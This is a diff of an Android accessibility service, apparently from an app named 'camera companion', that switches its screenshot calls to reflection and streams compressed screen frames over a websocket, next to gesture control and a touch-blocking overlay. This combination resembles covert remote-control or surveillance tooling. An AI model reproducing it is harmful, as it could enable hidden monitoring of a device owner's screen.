@@ -1,8 +1,6 @@
 package com.artem.cameracompanion
 
 import android.accessibilityservice.AccessibilityService
-import android.accessibilityservice.AccessibilityService.ScreenCapture
-import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
 import android.accessibilityservice.GestureDescription
 import android.annotation.SuppressLint
 import android.content.Intent
@@ -114,32 +112,45 @@ class ControlService : AccessibilityService() {
         if (now - lastScreenFrame < 150) { screenHandler.postDelayed({ scheduleScreenshot() }, 50); return }
         if (ws.queueSize() > 512 * 1024) { screenHandler.postDelayed({ scheduleScreenshot() }, 100); return }
 
-        takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor, object : TakeScreenshotCallback {
-            override fun onSuccess(screenshot: ScreenCapture) {
-                try {
-                    val hw = screenshot.hardwareBitmap
-                    val scale = minOf(1f, 720f / hw.width)
-                    val sw = (hw.width * scale).toInt()
-                    val sh = (hw.height * scale).toInt()
-                    val soft = hw.copy(Bitmap.Config.ARGB_8888, false)
-                    val bmp = if (scale < 1f) {
-                        Bitmap.createScaledBitmap(soft, sw, sh, true).also { soft.recycle() }
-                    } else soft
-                    val out = ByteArrayOutputStream()
-                    bmp.compress(Bitmap.CompressFormat.JPEG, 60, out)
-                    bmp.recycle()
-                    wsScreen?.send(out.toByteArray().toByteString())
-                    lastScreenFrame = System.currentTimeMillis()
-                } catch (_: Exception) {
-                } finally {
-                    try { screenshot.hardwareBitmap.recycle() } catch (_: Exception) {}
+        try {
+            val cbClass = Class.forName("android.accessibilityservice.AccessibilityService\$TakeScreenshotCallback")
+            val proxy = java.lang.reflect.Proxy.newProxyInstance(javaClass.classLoader, arrayOf(cbClass)) { _, method, args ->
+                when (method?.name) {
+                    "onSuccess" -> handleScreenCapture(args?.get(0))
+                    "onFailure" -> if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 500)
                 }
-                if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 100)
+                null
             }
-            override fun onFailure(errorCode: Int) {
-                if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 500)
-            }
-        })
+            AccessibilityService::class.java.getMethod(
+                "takeScreenshot", Int::class.java, java.util.concurrent.Executor::class.java, cbClass
+            ).invoke(this, Display.DEFAULT_DISPLAY, mainExecutor, proxy)
+        } catch (_: Exception) {
+            if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 1000)
+        }
+    }
+
+    private fun handleScreenCapture(capture: Any?) {
+        capture ?: run {
+            if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 500)
+            return
+        }
+        try {
+            val hw = capture.javaClass.getMethod("getHardwareBitmap").invoke(capture) as? Bitmap ?: return
+            val scale = minOf(1f, 720f / hw.width)
+            val sw = (hw.width * scale).toInt()
+            val sh = (hw.height * scale).toInt()
+            val soft = hw.copy(Bitmap.Config.ARGB_8888, false)
+            val bmp = if (scale < 1f) Bitmap.createScaledBitmap(soft, sw, sh, true).also { soft.recycle() } else soft
+            val out = ByteArrayOutputStream()
+            bmp.compress(Bitmap.CompressFormat.JPEG, 60, out)
+            bmp.recycle()
+            wsScreen?.send(out.toByteArray().toByteString())
+            lastScreenFrame = System.currentTimeMillis()
+        } catch (_: Exception) {
+        } finally {
+            try { capture.javaClass.getMethod("close").invoke(capture) } catch (_: Exception) {}
+        }
+        if (screenLoopRunning) screenHandler.postDelayed({ scheduleScreenshot() }, 100)
     }
 
     // ── Touch-block overlay ────────────────────────────────────────────────
